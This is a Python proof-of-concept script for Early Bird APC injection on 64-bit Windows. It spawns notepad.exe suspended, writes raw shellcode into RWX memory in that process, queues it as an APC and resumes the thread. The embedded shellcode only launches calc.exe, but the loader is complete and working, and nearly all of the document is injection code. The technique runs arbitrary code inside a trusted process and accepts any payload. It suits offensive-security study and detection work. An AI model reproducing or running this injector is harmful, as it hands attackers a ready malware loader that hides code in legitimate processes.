"""
(prod) Early Bird APC Injection
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: notepad.exe
- payload: shellcode, to spawn calc.exe


Note: the main difference with vanilla APC injection is the state of the injected process
- here, injected process starts SUSPENDED -> guaranteed to hit alert signal on resumption
- in vanilla APC injection, process already started -> chance process won't signal


Steps:
------
- Create SUSPENDED process              -> CreateProcessW()
- Allocate memory                       -> VirtualAllocEx()
- Write payload into allocated memory   -> WriteProcessMemory()
- Add to thread's APC queue             -> QueueUserAPC()
- Resume thread                         -> ResumeThread()
"""

import ctypes
from ctypes import wintypes
import msvcrt
import struct


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)


# ----------------------------------
# Payloads - sample(s)
# ----------------------------------

# msfvenon shellcode to spawn calc.exe - appended with NOPs (\x90) and infinite loop (\xEB\xFE -> jmp $)
# so that injected process (eg notepad) doesn't die and exit (viewable in ProcExp, TaskManager etc)

buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"

payload = buf +  b"\x90\x90\x90\xEB\xFE"




# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# specify Target Process to hollow/hijack
TARGET_PROCESS = r"c:\windows\system32\notepad.exe"

# CreateProcessW() - samples
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04

# VirtualAllocEx() / VirtualProtectEx () - samples
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80




# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("ExitStatus",                  ctypes.c_void_p),
    ("PebBaseAddress",              ctypes.c_void_p),
    ("AffinityMask",                ctypes.c_void_p),
    ("BasePriority",                ctypes.c_void_p),
    ("UniqueProcessId",             ctypes.c_void_p),
    ("InheritedFromUniqueProcessId",ctypes.c_void_p),
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes =[
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.QueueUserAPC.argtypes = [
    ctypes.c_void_p,        # pfnAPC, pointer to APC func called when thread performs alertable operation
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # dwData (ULONG_PTR -> void* works)
]
kernel32.QueueUserAPC.restype = wintypes.DWORD

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- Misc helper functions ---------------

def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


def pause(warning=False) -> None:
    """ Pause until user key press (any) """

    if warning:
        print("\n\n[!] WARNING: About to execute payload: ResumeThread()")
        print("[!]\tPress any key to continue...", end='', flush=True)
    else:
        print("\n\nPress any key to continue...", end='', flush=True)

    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


# --------------- Create SUSPENDED Process ---------------


def create_process(
    app: str=TARGET_PROCESS,
    flags: int=CREATE_SUSPENDED
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    """ 
    Create process in SUSPENDED state (default)
    - return HANDLEs and Ids to thread/process
    """

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print_hdr(hdr)

    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()


        # return handles/Ids to thread and process
        # NOTE: probably don't need to return everything here...
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        print(f"-> Process created: {lpApplicationName}")
        print(f"-> Process Id: {dwProcessId}")
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")


# --------------- Memory Manipulation ---------------


def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process
    
    Requesting allocation address same as img_base_addr
    - if not available, ptr= assignment should fail and error out
    """

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print_hdr(hdr)
    
    lpAddress = ctypes.c_void_p(0)
    
    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    return ptr




def write_payload_shellcode(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: WriteProcessMemory()")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print(f"    -> Bytes written: {n_written.value}")


# --------------- Execution ---------------


def add_to_apc_queue(lpBaseAddress: wintypes.c_void_p, hThread: wintypes.HANDLE) -> int:
    """ Add memory pointer to malicious payload, to APC queue of specified thread """
    
    print(f"[+] Adding memory pointer to APC queue: QueueUserAPC()")
    if not kernel32.QueueUserAPC(lpBaseAddress, hThread, 0):
        raise winerr()

    print(f"    -> Success")
    

def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"    -> ProcessId: {dwProcessId}")
    print(f"    -> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




##########################################
##### Main functionality starts here #####
##########################################


# create target process <- return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process()


# ------------------------------------------------------
hdr = "\n >>>>    Phase: Memory Manipulation    <<<<\n"
print_hdr(hdr)

# allocate memory
lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))

# write payload into allocated memory
write_payload_shellcode(hProcess, lpBaseAddress, payload)


# ------------------------------------------------------
hdr = "\n >>>>    Phase: Execution    <<<<\n"
print_hdr(hdr)

# queue APC
add_to_apc_queue(lpBaseAddress, hThread)

# confirm execution of payload
pause(warning=True)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)


# ------------------------------------------------------
hdr = "\n >>>>    Phase: Clean-up    <<<<\n"
print_hdr(hdr)

# close all handles
print()
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
